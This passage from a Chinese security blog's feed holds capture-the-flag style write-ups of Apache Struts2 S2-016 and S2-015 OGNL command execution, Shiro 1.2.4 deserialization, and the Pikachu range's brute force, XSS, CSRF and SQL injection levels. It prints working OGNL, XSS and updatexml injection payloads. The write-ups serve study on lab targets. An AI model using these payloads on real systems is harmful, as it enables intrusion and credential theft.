    <content type="html"><![CDATA[<p>复现的是墨者的Apache Struts2的靶场，用的工具检测~~<span id="more"></span></p><h1 id="原理："><a href="#原理：" class="headerlink" title="原理："></a><strong>原理</strong>：</h1><p>问题主要出在对于特殊URL处理中，redirect与redirectAction后面跟上OGNL表达式会被服务器执行。</p><h1 id="漏洞原因："><a href="#漏洞原因：" class="headerlink" title="漏洞原因："></a><strong>漏洞原因</strong>：</h1><p>action的值redirect和redirectAction没有正确过滤，导致可以执行任意代码，如系统命令、上传、下载文件等。</p><p>Struts2的DefaultActionMapper支持一种方法，可以使用”action:”, “redirect:” , “redirectAction:”对输入信息进行处理，从而改变前缀参数，这样操作的目的是方便表单中的操作。在2.3.15.1版本以前的struts2中，没有对”action:”, “redirect:” , “redirectAction:”等进行处理，导致ongl表达式可以被执行。</p><h1 id="影响版本："><a href="#影响版本：" class="headerlink" title="影响版本："></a><strong>影响版本</strong>：</h1><p>Struts 2.0.0 – 2.3.15</p><h1 id="1-在url后面添加index-action，回显正常，可能存在漏洞。"><a href="#1-在url后面添加index-action，回显正常，可能存在漏洞。" class="headerlink" title="1.在url后面添加index.action，回显正常，可能存在漏洞。"></a>1.在url后面添加index.action，回显正常，可能存在漏洞。</h1><p> <img src="/posts/fd38/1.png" class></p><h1 id="2-利用Struts2漏洞检测工具，输入url（记得一定要加index-action）"><a href="#2-利用Struts2漏洞检测工具，输入url（记得一定要加index-action）" class="headerlink" title="2.利用Struts2漏洞检测工具，输入url（记得一定要加index.action）"></a>2.利用Struts2漏洞检测工具，输入url（记得一定要加index.action）</h1><p>可以看到漏洞存在：</p><p> <img src="/posts/fd38/2.png" class></p><h1 id="3-执行命令ls，看到有一个key-txt"><a href="#3-执行命令ls，看到有一个key-txt" class="headerlink" title="3.执行命令ls，看到有一个key.txt"></a>3.执行命令ls，看到有一个key.txt</h1><p> <img src="/posts/fd38/3.png" class></p><h1 id="4-使用命令cat-key-txt获取key-txt的内容，得到flag"><a href="#4-使用命令cat-key-txt获取key-txt的内容，得到flag" class="headerlink" title="4.使用命令cat key.txt获取key.txt的内容，得到flag"></a>4.使用命令cat key.txt获取key.txt的内容，得到flag</h1><p> <img src="/posts/fd38/4.png" class></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>框架漏洞</tag>
      
      <tag>Apache Struts2</tag>
      
      <tag>代码执行</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Apache Struts2远程代码执行漏洞(S2-015)</title>
    <link href="/posts/d38.html"/>
    <url>/posts/d38.html</url>
    
    <content type="html"><![CDATA[<p>复现的是墨者的Apache Struts2的靶场，用了两种方式，手工和工具检测~~</p><span id="more"></span><h1 id="漏洞简介："><a href="#漏洞简介：" class="headerlink" title="漏洞简介："></a><strong>漏洞简介</strong>：</h1><p>开源应用框架Apache Struts存在远程代码执行漏洞（CVE-2021-31805），攻击者可构造恶意的OGNL表达式触发漏洞，实现远程代码执行。</p><h1 id="特征："><a href="#特征：" class="headerlink" title="特征："></a><strong>特征</strong>：</h1><p>查看被测应用系统的源码，URL 接口地址以 “.action” “.do” 结尾或地址中包含“!”符号，或者在被测应用的服务器上查看应用所在目录/WEB-INF/lib/下 的 jar 文件，若存在 struts2-core-2.<em>.**.jar 或 xwork-core- 2.</em>.**.jar 格式的 jar 文件，则需检测是否存在 Struts2 远程代码执行漏洞。</p><h1 id="受影响版本为："><a href="#受影响版本为：" class="headerlink" title="受影响版本为："></a><strong>受影响版本为</strong>：</h1><p>Apache Struts 2.0.0~2.5.29。</p><h1 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h1><h2 id="1、在url后面添加-1-2-action："><a href="#1、在url后面添加-1-2-action：" class="headerlink" title="1、在url后面添加${1+2}.action："></a>1、在url后面添加${1+2}.action：</h2><pre class="line-numbers language-py"><code class="language-py">访问http://124.70.71.251:45344/$&#123;1+2&#125;.action<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现存在回显</p><p>  <img src="/posts/d38/1.png" class></p><h2 id="2、发现key-txt，构造："><a href="#2、发现key-txt，构造：" class="headerlink" title="2、发现key.txt，构造："></a>2、发现key.txt，构造：</h2><pre class="line-numbers language-bash"><code class="language-bash">/%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23m.setAccessible%28true%29%2C%23m.set%28%23_memberAccess%2Ctrue%29%2C%23q%3D@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27ls%27%29.getInputStream%28%29%29%2C%23q%7D.action<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>  <img src="/posts/d38/2.png" class></p><h2 id="3、访问key-txt："><a href="#3、访问key-txt：" class="headerlink" title="3、访问key.txt："></a>3、访问key.txt：</h2><pre class="line-numbers language-bash"><code class="language-bash">%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23m.setAccessible%28true%29%2C%23m.set%28%23_memberAccess%2Ctrue%29%2C%23q%3D@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27cat%20key.txt%27%29.getInputStream%28%29%29%2C%23q%7D.action<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>  <img src="/posts/d38/3.png" class></p><h1 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h1><h2 id="1、利用Struts2漏洞检测工具，输入url（我这个工具是要加index-action）"><a href="#1、利用Struts2漏洞检测工具，输入url（我这个工具是要加index-action）" class="headerlink" title="1、利用Struts2漏洞检测工具，输入url（我这个工具是要加index.action）"></a>1、利用Struts2漏洞检测工具，输入url（我这个工具是要加index.action）</h2><p>可以看到漏洞存在：</p><p>  <img src="/posts/d38/4.png" class></p><h2 id="2、执行命令ls，看到有一个key-txt"><a href="#2、执行命令ls，看到有一个key-txt" class="headerlink" title="2、执行命令ls，看到有一个key.txt"></a>2、执行命令ls，看到有一个key.txt</h2><p>  <img src="/posts/d38/5.png" class></p><h2 id="3、使用命令cat-key-txt获取key-txt的内容，得到flag"><a href="#3、使用命令cat-key-txt获取key-txt的内容，得到flag" class="headerlink" title="3、使用命令cat key.txt获取key.txt的内容，得到flag"></a>3、使用命令cat key.txt获取key.txt的内容，得到flag</h2><p>  <img src="/posts/d38/6.png" class></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>框架漏洞</tag>
      
      <tag>Apache Struts2</tag>
      
      <tag>代码执行</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Apache Shiro 1.2.4反序列化漏洞</title>
    <link href="/posts/9532.html"/>
    <url>/posts/9532.html</url>
    
    <content type="html"><![CDATA[<p>前几天复现了一下墨者平台的shiro靶场，本篇文章用的是工具检测的~~</p><span id="more"></span><h1 id="1、漏洞简述"><a href="#1、漏洞简述" class="headerlink" title="1、漏洞简述"></a>1、漏洞简述</h1><p>Shiro默认使用了CookieRememberMeManager, 其处理cookie的流程是: 得到rememberMe的cookie值–&gt;Base64解码–&gt;AES解密–&gt;反序列化.然而AES的密钥是硬编码的, 密钥泄漏的根本原因是开发人员在开发过程中部分代码直接使用了网上的一些开源的项目代码，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞。</p><h2 id="2、影响版本"><a href="#2、影响版本" class="headerlink" title="2、影响版本"></a>2、影响版本</h2><p>Apache Shiro &lt;= 1.2.4</p><h1 id="3、Shiro框架识别"><a href="#3、Shiro框架识别" class="headerlink" title="3、Shiro框架识别"></a>3、Shiro框架识别</h1><p>(1)请求包的cookie中存在rememberMe字段。</p><p>(2)返回包中存在set-Cookie：remeberMe=deleteMe。</p><p>(3)请求包中存在rememberMe=x时，响应包中存在rememberMe=deleteMe。（有时候服务器不会主动返回remeberMe=deleteMe，直接发包即可，将Cookie内容改为remember Me=1，若相应包有rememberMe=deleteMe，则基本可以确定⽹站是apache shiro搭建的。）</p><p>(4) URL中有shiro字样</p><p>将cookie内容改为rememberMe=1情况：</p><p> <img src="/posts/9532/1.png" class></p><h1 id="4-选择一个账户登录，勾选remember-me"><a href="#4-选择一个账户登录，勾选remember-me" class="headerlink" title="4.选择一个账户登录，勾选remember me"></a>4.选择一个账户登录，勾选remember me</h1><p> <img src="/posts/9532/2.png" class></p><h1 id="5-从请求的返回包判断出使用了shiro"><a href="#5-从请求的返回包判断出使用了shiro" class="headerlink" title="5.从请求的返回包判断出使用了shiro"></a>5.从请求的返回包判断出使用了shiro</h1><p> <img src="/posts/9532/3.png" class></p><h1 id="6-1利用burp插件得到密钥"><a href="#6-1利用burp插件得到密钥" class="headerlink" title="6.1利用burp插件得到密钥"></a>6.1利用burp插件得到密钥</h1><p>burp插件下载：<a href="https://github.com/pmiaowu/BurpShiroPassiveScan/releases/tag/BurpShiroPassiveScan-2.0.0">https://github.com/pmiaowu/BurpShiroPassiveScan/releases/tag/BurpShiroPassiveScan-2.0.0</a></p><p>这个插件是被动式检测，会对burp获取到的请求自动做检测。若存在，有几种查看方式。</p><p>方式一：ShiroScan中可直接查看信息（这种方式最快捷）</p><p> <img src="/posts/9532/a.png" class></p><p>方式二：到Extender——ShiroScan的Output中查看日志</p><p> <img src="/posts/9532/b.png" class></p><p>方式三：在Target——Site map——找到对应目标——问题中可以看到信息</p><p> <img src="/posts/9532/c.png" class></p><h1 id="6-2利用shiro工具检测"><a href="#6-2利用shiro工具检测" class="headerlink" title="6.2利用shiro工具检测"></a>6.2利用shiro工具检测</h1><p>放入url，点击爆破密钥，存在密钥，得到密钥：</p><p> <img src="/posts/9532/4.png" class></p><p>然后点击爆破利用链及回显，发现构造链即可进行功能利用。</p><h1 id="7-然后命令执行找到一个key-txt"><a href="#7-然后命令执行找到一个key-txt" class="headerlink" title="7.然后命令执行找到一个key.txt"></a>7.然后命令执行找到一个key.txt</h1><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ls</span> /<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> <img src="/posts/9532/5.png" class></p><h1 id="8-查看key-txt，得到flag"><a href="#8-查看key-txt，得到flag" class="headerlink" title="8.查看key.txt，得到flag"></a>8.查看key.txt，得到flag</h1><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cat</span> /key.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/posts/9532/6.png" class>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>框架漏洞</tag>
      
      <tag>Apache shiro</tag>
      
      <tag>反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pikachu靶场</title>
    <link href="/posts/6011.html"/>
    <url>/posts/6011.html</url>
    
    <content type="html"><![CDATA[<p>今天传的是前一段时间打的pikachu靶场。<span id="more"></span></p><p>咱就是说，前一段时间，我的github被标记成机器人了。百度了一下，然后给那边发了封邮件，来来回回两次才总算弄好。我还不够勤快嘛，还把我标记了呜呜呜。</p><!--more--><h1 id="1、Burte-Force-暴力破解"><a href="#1、Burte-Force-暴力破解" class="headerlink" title="1、Burte Force(暴力破解)"></a>1、Burte Force(暴力破解)</h1><h2 id="1-1-基于表单的暴力破解"><a href="#1-1-基于表单的暴力破解" class="headerlink" title="1.1 基于表单的暴力破解"></a>1.1 基于表单的暴力破解</h2><p>用burp暴力破解，截取到包，然后发送给Intruder（测试器），由于用户名和密码都不知道，所以攻击类型选择Clusterbomb（集中炸弹）模式。在payloads中分别载入用户名和密码的字典。</p><p>最后发现用户名为admin，密码为123456。</p><img src="/posts/6011/1.png" class><p>登录成功会出现如下提示：</p><p> <img src="/posts/6011/1_2.png" class></p><h2 id="1-2-验证码绕过（on-server）"><a href="#1-2-验证码绕过（on-server）" class="headerlink" title="1.2 验证码绕过（on server）"></a>1.2 验证码绕过（on server）</h2><p>这题加了个验证码，同样，先使用burp拦截请求，这次先发送给Repeater（重发器）。先点击发送，在响应里面看到用户名或密码错误，再修改一下用户名或者密码，观察出现的结果。</p><p>如果结果是验证码错误，则验证码会刷新，就不能爆破。但结果若还是显示账户或密码错误，则表示验证码在某一段时间内不会刷新，因此可以使用暴力破解。</p><p> <img src="/posts/6011/1_3.png" class></p><p>第二次发送时还是显示账户或密码错误，因此验证码短时间内不会刷新，可以使用暴力破解。</p><p> <img src="/posts/6011/1_4.png" class></p><p>这时，就可以把请求内容发送给测试器，按照上面那题的做法暴力破解密码。</p><p>最后，发现用户名为admin，密码为123456</p><p> <img src="/posts/6011/1_5.png" class></p><p>登录成功：</p><p> <img src="/posts/6011/1_6.png" class></p><h2 id="1-3-验证码绕过（on-client）"><a href="#1-3-验证码绕过（on-client）" class="headerlink" title="1.3 验证码绕过（on client）"></a>1.3 验证码绕过（on client）</h2><p>在这里，验证码如果输入错误，则出现弹窗。即JavaScript验证验证码。直接用burp抓包，发送到重发器，将验证码删掉即可。</p><p> <img src="/posts/6011/1_7.png" class></p><p>可以看到删掉之后，没有出现验证码错误，说明即使验证码会变，但可以直接删掉不验证：</p><p> <img src="/posts/6011/1_8.png" class></p><p>所以直接爆破即可。</p><p>得到用户名为admin,密码为123456。</p><p>其实哦，我发现这题呀，虽然考察的是上面这种情况，但是在重发器里面即使不删掉验证码，也不会显示验证码错误，所以也可以直接爆破得到用户名和密码。</p><h2 id="1-4-token防爆破"><a href="#1-4-token防爆破" class="headerlink" title="1.4 token防爆破"></a>1.4 token防爆破</h2><p>在抓取数据包时，发现多了个token:</p><p> <img src="/posts/6011/1_9.png" class></p><p>在重发器中，发现token由响应包确定了，如果请求中没有带上正确的token，会显示csrf token error，因此无法验证账户密码的正确性。</p><p> <img src="/posts/6011/1_10.png" class></p><p>但是，可以在响应包中发现有一个隐藏的表单，里面存放了下一次的token值。所以，我们需要每一次在发送请求包时要拿到上一个返回包的token值放到token包里面。</p><p>  <img src="/posts/6011/1_11.png" class></p><p>把包先发送到测试器，在position中将攻击类型选择Pitchfork（音叉），选择密码和token</p><p>  <img src="/posts/6011/1_12.png" class></p><p>在options中将线程数设为1(只有获取上一个请求返回的token值才能，做下一次请求，无法并发)</p><p>  <img src="/posts/6011/1_13.png" class></p><p>在Grep-Extract选项中添加参数，获取回复，选中token的值复制一下，然后点击ok。</p><p>  <img src="/posts/6011/1_14.png" class></p><p>在最下面找到always（总是）选项</p><p>  <img src="/posts/6011/1_15.png" class></p><p>回到payloads模块，正常添加第一个变量密码的字典。</p><p>第二个变量类型选择递归搜索（Recursive grep），在第一个请求有效负载中粘贴刚刚复制的token值。</p><p>  <img src="/posts/6011/1_16.png" class></p><p>开始攻击：</p><p>  <img src="/posts/6011/1_17.png" class></p><p>成功得到密码为123456。</p><h1 id="2、Cross-Site-Scripting-XSS跨站脚本漏洞"><a href="#2、Cross-Site-Scripting-XSS跨站脚本漏洞" class="headerlink" title="2、Cross-Site Scripting(XSS跨站脚本漏洞)"></a>2、Cross-Site Scripting(XSS跨站脚本漏洞)</h1><h2 id="2-1-反射型XSS-get"><a href="#2-1-反射型XSS-get" class="headerlink" title="2.1 反射型XSS(get)"></a>2.1 反射型XSS(get)</h2><p>输入好像受到了限制，点击submit，发现可以直接在url后面输入：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>script<span class="token operator">></span>alert<span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token operator">&lt;</span>/script<span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> <img src="/posts/6011/2.png" class></p><p>成功出现弹窗：</p><p>  <img src="/posts/6011/2_2.png" class></p><p>也可以直接在前端将限制长度改大一点，这样就能输入payload了：</p><p> <img src="/posts/6011/2_3.png" class></p><h2 id="2-2-反射型XSS-post"><a href="#2-2-反射型XSS-post" class="headerlink" title="2.2 反射型XSS(post)"></a>2.2 反射型XSS(post)</h2><p>登录框不能出现xss弹窗，登录进去之后有个输入框，</p><p>  <img src="/posts/6011/2_4.png" class></p><p>构造payload，成功出现弹窗：</p><p>  <img src="/posts/6011/2_5.png" class></p><h2 id="2-3-存储型XSS"><a href="#2-3-存储型XSS" class="headerlink" title="2.3 存储型XSS"></a>2.3 存储型XSS</h2><p>看到一个留言板，构造payload：</p><p>  <img src="/posts/6011/2_6.png" class></p><p>成功出现弹窗：</p><p>  <img src="/posts/6011/2_7.png" class></p><p>因为是存储型XSS,所以只要点击submit，就会一直出现弹窗。</p><h2 id="2-4-DOM型XSS"><a href="#2-4-DOM型XSS" class="headerlink" title="2.4 DOM型XSS"></a>2.4 DOM型XSS</h2><p>尝试构造payload，发现有个超链接，里面是不被允许访问，</p><p>查看一下网页代码元素：</p><p>  <img src="/posts/6011/2_8.png" class></p><p>发现我们构造的语句被放在一个超链接里面了，那我直接构造一个关于超链接的payload：</p><pre class="line-numbers language-bash"><code class="language-bash">javascript:alert<span class="token punctuation">(</span>/xss/<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>即形成了：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>a href<span class="token operator">=</span>javascript:alert<span class="token punctuation">(</span>/xss/<span class="token punctuation">)</span><span class="token operator">></span>xss<span class="token operator">&lt;</span>/a<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在输入框输入之后，再次点击那个超链接时，出现了弹窗：</p><p>  <img src="/posts/6011/2_9.png" class></p><h2 id="2-5-DOM型XSS-X"><a href="#2-5-DOM型XSS-X" class="headerlink" title="2.5 DOM型XSS-X"></a>2.5 DOM型XSS-X</h2><p>在输入框中尝试，没有结果，下面出现一个超链接，点击一个又出现另一个超链接，于是我又查看一下代码，发现刚刚构造的语句出现在了第二个超链接里面：</p><img src="/posts/6011/2_10.png" class><p>跟上面的思路就差不多啦。我继续在输入框中输入：</p><pre class="line-numbers language-bash"><code class="language-bash">javascript:alert<span class="token punctuation">(</span>/xss/<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>再次点击第二个超链接，成功出现弹窗：</p><p>  <img src="/posts/6011/2_11.png" class></p><h2 id="2-6-XSS之盲打"><a href="#2-6-XSS之盲打" class="headerlink" title="2.6 XSS之盲打"></a>2.6 XSS之盲打</h2><p>盲打就是在一切可能的地方尽可能多的提交xss语句，然后看哪一条会被执行，就能获取管理员的cooike。</p><p>有两个输入框，于是我在两个输入框都放上payload，没有反应，在提示下登录后台查看（后台账号为admin，密码为123456），发现出现弹窗：</p><p> <img src="/posts/6011/2_12.png" class></p><h2 id="2-7-XSS之过滤"><a href="#2-7-XSS之过滤" class="headerlink" title="2.7 XSS之过滤"></a>2.7 XSS之过滤</h2><p>先尝试在输入框输入payload，发现没有反应，查看url地址栏:</p><p> <img src="/posts/6011/2_13.png" class></p><p>发现可能是对某些特殊字符进行了过滤，那我换一个payload试试：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>img src<span class="token operator">=</span>111 onerror<span class="token operator">=</span>alert<span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>成功出现了弹窗：</p><p> <img src="/posts/6011/2_14.png" class></p><p>其实还有很多，比如大小写绕过，构造payload：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>sCRipt<span class="token operator">></span>alert<span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token operator">&lt;</span>/sCRipt<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/posts/6011/2_15.png" class><h2 id="2-8-XSS之htmlspecialchars"><a href="#2-8-XSS之htmlspecialchars" class="headerlink" title="2.8 XSS之htmlspecialchars"></a>2.8 XSS之htmlspecialchars</h2><p>又是在输入框尝试无果，出现了超链接，那就查看一下代码吧：</p><p> <img src="/posts/6011/2_16.png" class></p><p>发现一些特殊字符被过滤掉啦，是时候又该搬出来我可以直接放在超链接里面的payload了：</p><pre class="line-numbers language-bash"><code class="language-bash">javascript:alert<span class="token punctuation">(</span>/xss/<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>点击一下那个超链接，成功出现弹窗：</p><p> <img src="/posts/6011/2_17.png" class></p><h2 id="2-9-XSS之href输出"><a href="#2-9-XSS之href输出" class="headerlink" title="2.9 XSS之href输出"></a>2.9 XSS之href输出</h2><p>又是有超链接，这个套路我们前面已经用过啦，直接上payload：</p><pre class="line-numbers language-bash"><code class="language-bash">javascript:alert<span class="token punctuation">(</span>/xss/<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>点击超链接，成功出现弹窗</p><img src="/posts/6011/2_18.png" class><h2 id="2-10-XSS之js输出"><a href="#2-10-XSS之js输出" class="headerlink" title="2.10 XSS之js输出"></a>2.10 XSS之js输出</h2><p>在输入框中尝试，没有反应，看看提示，要我输入tmac，输入之后，出现一张图片，那我直接利用图片构造payload，也是前面提到过的：</p><p>直接把图片里面的src改成一个错误的，那这样它就会执行onerror啦。</p><p> <img src="/posts/6011/2_19.png" class></p><p>成功出现弹窗：</p><img src="/posts/6011/2_20.png" class><h1 id="3、CSRF-跨站请求伪造"><a href="#3、CSRF-跨站请求伪造" class="headerlink" title="3、CSRF(跨站请求伪造)"></a>3、CSRF(跨站请求伪造)</h1><h2 id="3-1-CSRF-get"><a href="#3-1-CSRF-get" class="headerlink" title="3.1 CSRF(get)"></a>3.1 CSRF(get)</h2><p>根据提示，随便登录一个账户，我选择了账户名为lili,密码为123456，进去之后，简单修改下信息，点击提交</p><p> <img src="/posts/6011/3.png" class></p><p>用burp进行抓包分析：</p><p> <img src="/posts/6011/3_2.png" class></p><p>发现后台没设置CSRF token,是通过get请求来提交修改信息的，可直接在url中修改。例如我将其中的地址改成china：</p><pre class="line-numbers language-bash"><code class="language-bash">http://192.168.56.1:8099/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex<span class="token operator">=</span>girl<span class="token operator">&amp;</span>phonenum<span class="token operator">=</span>18656565545<span class="token operator">&amp;</span>add<span class="token operator">=</span>china<span class="token operator">&amp;</span>email<span class="token operator">=</span>lili%40pikachu.com<span class="token operator">&amp;</span>submit<span class="token operator">=</span>submit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将此URL地址发送给被攻击者，如果被攻击者此时登录状态或cookie/session没有过期，点击时，地址就会被修改：</p><p>  <img src="/posts/6011/3_3.png" class></p><h2 id="3-2-CSRF-post"><a href="#3-2-CSRF-post" class="headerlink" title="3.2 CSRF(post)"></a>3.2 CSRF(post)</h2><p>同样，先登录一个账号：</p><p>  <img src="/posts/6011/3_4.png" class></p><p>点击修改个人信息，用burp抓包：</p><p> <img src="/posts/6011/3_5.png" class></p><p>如果是POST型的，所有参数在请求体中提交，我们不能通过伪造URL的方式进行攻击。</p><p>这种方法其实对于get和post请求都适用：</p><p>burp抓包之后，通过burp自带的csrf poc，复制url，当点击这个url时，信息就会被修改（这里修改的信息是将性别从boy改成girl）</p><p> <img src="/posts/6011/3_6.png" class></p><p>点击那个按钮，信息将会被自动修改，证明存在csrf漏洞：</p><p> <img src="/posts/6011/3_7.png" class></p><h2 id="3-3-CSRF-Token"><a href="#3-3-CSRF-Token" class="headerlink" title="3.3 CSRF Token"></a>3.3 CSRF Token</h2><p>同样，在修改信息时抓包，发现加入了token。</p><p>由于token值每次提交后都会失效，恶意攻击者抓到被攻击者的GET请求时里面的token已经失效了，所以网站也就没有执行GET请求的操作，CSRF也就防御成功。</p><p>  <img src="/posts/6011/3_8.png" class></p><h1 id="4、SQL-Inject-SQL注入漏洞"><a href="#4、SQL-Inject-SQL注入漏洞" class="headerlink" title="4、SQL-Inject(SQL注入漏洞)"></a>4、SQL-Inject(SQL注入漏洞)</h1><h2 id="4-1-数字型注入-post"><a href="#4-1-数字型注入-post" class="headerlink" title="4.1 数字型注入(post)"></a>4.1 数字型注入(post)</h2><p>本关为数字型注入，页面有一个下拉列表，不同的数字对应不同的值，这个数字这里可能存在注入。</p><p>任意选择一个数字，点击查询，用burp抓包，放到重发器，在数字后面输入单引号，发现有报错信息：</p><p>  <img src="/posts/6011/4.png" class></p><h3 id="可以利用报错注入："><a href="#可以利用报错注入：" class="headerlink" title="可以利用报错注入："></a>可以利用报错注入：</h3><h5 id="①获取数据库用户名"><a href="#①获取数据库用户名" class="headerlink" title="①获取数据库用户名"></a>①获取数据库用户名</h5><pre class="line-numbers language-bash"><code class="language-bash">payload:id<span class="token operator">=</span>3 or updatexml<span class="token punctuation">(</span>1,,concat<span class="token punctuation">(</span>0x7e,user<span class="token punctuation">(</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>得到数据库用户名为root@localhost</p><p>  <img src="/posts/6011/4_2.png" class></p><h5 id="②获得数据库名"><a href="#②获得数据库名" class="headerlink" title="②获得数据库名"></a>②获得数据库名</h5><pre class="line-numbers language-bash"><code class="language-bash">payload:id<span class="token operator">=</span>3 or updatexml<span class="token punctuation">(</span>1,,concat<span class="token punctuation">(</span>0x7e,database<span class="token punctuation">(</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>得到数据库用户名为pikachu</p><p>   <img src="/posts/6011/4_3.png" class></p><h5 id="③获得表名"><a href="#③获得表名" class="headerlink" title="③获得表名"></a>③获得表名</h5><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>3 or updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select substr<span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span>,1,31<span class="token punctuation">)</span> from information_schema.tables where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>   <img src="/posts/6011/4_4.png" class></p><p>因为updatexml只能获取32字节的内容，我用substr()函数获得后面的字节：</p><p>   <img src="/posts/6011/4_5.png" class></p><h5 id="④获得字段名"><a href="#④获得字段名" class="headerlink" title="④获得字段名"></a>④获得字段名</h5><p>由前面获取的表名，可以看出用户名的表为users</p><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>3 or updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select substr<span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span>,1,31<span class="token punctuation">)</span> from information_schema.columns where table_name<span class="token operator">=</span><span class="token string">'users'</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可以得到所有列名：</p><p>   <img src="/posts/6011/4_6.png" class></p><h5 id="⑤获得用户名和密码"><a href="#⑤获得用户名和密码" class="headerlink" title="⑤获得用户名和密码"></a>⑤获得用户名和密码</h5><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>3 or updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select substr<span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>username,0x3a,password<span class="token punctuation">)</span>,1,31<span class="token punctuation">)</span> from <span class="token string">'users'</span> limit 1<span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>   <img src="/posts/6011/4_7.png" class></p><p>用substr()函数依次获得哈，密码应该是用md5加密了，可以丢到md5解密工具进行解密。</p><h2 id="4-2-字符型注入-get"><a href="#4-2-字符型注入-get" class="headerlink" title="4.2 字符型注入(get)"></a>4.2 字符型注入(get)</h2><p>可以看到页面有一个输入框，输入单引号报错，输入两个单引号不报错，存在注入：</p><h5 id="获得数据库名："><a href="#获得数据库名：" class="headerlink" title="获得数据库名："></a>获得数据库名：</h5><pre class="line-numbers language-bash"><code class="language-bash">payload：'or updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,database<span class="token punctuation">(</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可以看到数据库名</p><p>   <img src="/posts/6011/4_8.png" class></p><p>其他payload跟4.1大差不差，就不写了。</p><h2 id="4-3-搜索型注入"><a href="#4-3-搜索型注入" class="headerlink" title="4.3 搜索型注入"></a>4.3 搜索型注入</h2><p>这里也有个输入框，输入单引号报错，两个单引号不报错。</p><p>payload用4.2完全可以。</p><h5 id="获得数据库用户名："><a href="#获得数据库用户名：" class="headerlink" title="获得数据库用户名："></a>获得数据库用户名：</h5><pre class="line-numbers language-bash"><code class="language-bash">payload：'or updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,user<span 